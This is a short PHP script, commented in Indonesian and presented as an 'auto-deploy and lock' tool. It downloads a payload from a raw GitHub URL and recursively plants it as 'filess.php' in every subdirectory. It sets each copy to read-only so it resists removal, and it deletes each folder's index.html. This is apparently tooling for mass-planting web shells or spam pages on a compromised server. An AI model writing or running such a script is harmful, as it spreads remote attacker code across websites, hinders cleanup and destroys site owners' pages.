<?php
/**
 * SCRIPT AUTO-DEPLOY & LOCK (DYNAMIC SOURCE)
 * Fitur: Mengambil konten dari GitHub, Rekursif, & Lock File (0444)
 */

// 1. URL Sumber Konten
$url = "https://raw.githubusercontent.com/Seosetanitem/shizou/refs/heads/main/cb";

echo "<pre>";
echo "--- Memulai Proses Deployment ---\n";

// 2. Ambil konten dari URL
$indexContent = @file_get_contents($url);

if ($indexContent === false) {
    die("[ERROR] Gagal mengambil konten dari URL. Pastikan 'allow_url_fopen' aktif atau URL benar.");
}

echo "Konten berhasil diambil dari GitHub.\n\n";

function deployAndLock($dir, $content) {
    $items = scandir($dir);
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        
        if (is_dir($path)) {
            $targetFile = $path . DIRECTORY_SEPARATOR . 'filess.php';
            
            // Buka kunci jika file lama sudah ada
            if (file_exists($targetFile)) {
                @chmod($targetFile, 0644);
            }
            
            // Tanam konten baru
            if (file_put_contents($targetFile, $content)) {
                // Kunci file menjadi Read-Only (0444)
                chmod($targetFile, 0444);
                echo "[INSTALLED & LOCKED] $targetFile\n";
            }
            
            // Bersihkan index.html agar tidak konflik
            $htmlFile = $path . DIRECTORY_SEPARATOR . 'index.html';
            if (file_exists($htmlFile)) {
                @chmod($htmlFile, 0644);
                @unlink($htmlFile);
            }

            // Jalankan rekursif ke sub-folder
            deployAndLock($path, $content);
        }
    }
}

// Jalankan proses dari direktori saat ini
deployAndLock('.', $indexContent);

echo "\n--- Proses Selesai. Semua file telah dikunci (0444). ---";
echo "</pre>";
?>
